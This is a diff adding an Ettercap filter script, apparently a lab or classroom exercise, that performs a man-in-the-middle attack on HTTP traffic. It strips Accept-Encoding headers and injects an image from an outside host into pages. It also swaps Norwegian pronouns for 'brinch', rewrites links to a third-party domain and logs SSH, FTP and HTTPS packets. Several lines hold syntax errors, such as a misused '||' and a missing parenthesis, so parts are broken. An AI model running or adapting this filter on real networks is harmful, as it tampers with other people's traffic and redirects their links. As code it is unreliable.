@@ -1,0 +1,54 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+ if (search(DATA.data, "Accept-Encoding")) {
+    replace("Accept-Encoding", "Accept-Rubbish!"); 
+  # note: replacement string is same length as original string
+    msg("zapped Accept-Encoding!\n");
+    }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+ replace("img src=", "img src=\"http://noisyservers.noip.me/drop/brinch.gif\" ");
+ replace("IMG SRC=", "img src=\"http://noisyservers.noip.me/drop/brinch.gif\" ");
+ msg("Picture Replacement Ran.\n");
+}
+
+#Everything from here and down, have we written with help from the etterfilter man
+
+if (ip.proto == TCP && tcp.src == 80) {
+replace("jeg", "brinch" || "Jeg", "brinch")
+replace("deg", "brinch" || "Deg", "brinch")
+replace("Du", "brinch" || "du", "brinch")
+replace("Han", "brinch" || "Han", "brinch")
+replace("hun", "brinch" || "Hun", "brinch")
+msg("Word Replacement Ran.\n");
+}
+
+if ip.proto == TCP && tcp.src == 80){
+replace("a href=", "a href=\"https://friday.horse/" " || "A HREF=", "A HREF=\"https://friday.horse/" ");
+msg("URL Replacement Ran.\n")
+}
+
+#Tells if it detects Diffrent types of Traffic like ssh, ftp, telnet and https
+if (ip.proto == TCP){
+	if (tcp.src == 22 || tcp.dst == 22){
+		msg("SSH Packet Detected.\n");
+	}
+}
+
+if (ip.proto == TCP){
+	if (tcp.src == 21 || tcp.dst == 21){
+		msg("FTP Packet Detected.\n");
+	}
+}
+
+if (ip.proto == TCP){
+	if (tcp.src == 22 || tcp.dst == 22){
+		msg("SSH Packet\n");
+	}
+}
+
+if (ip.proto == TCP){
+	if (tcp.src == 443 || tcp.dst == 443){
+		msg("HTTPS Packet Detected.\n");
+	}
+}
